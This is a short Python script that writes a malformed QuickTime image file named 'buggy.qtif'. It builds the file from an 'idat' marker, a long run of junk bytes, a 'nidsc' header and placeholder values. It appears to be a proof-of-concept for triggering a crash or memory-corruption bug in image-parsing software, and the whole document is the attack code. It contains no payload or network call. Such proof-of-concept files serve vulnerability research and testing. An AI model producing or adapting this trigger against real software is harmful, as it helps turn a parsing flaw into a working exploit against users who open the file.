# /usr/bin/python
buff = ""
buff += "\x00\x00\x48\x79\x69\x64\x61\x74"
buff += "\x5A"*18545			#Junks
buff += "\x00\x00\x00\x6E\x69\x64\x73\x63"	#nidsc header
buff += "\x42\x42\x42\x42"
buff += "\x5A"*82				#Junk
buff += "\x41"*3
buff += "\x42"	
buff += "\x58\x58\x58\x58"
f = open('buggy.qtif','w')
f.write(buff)
f.close()
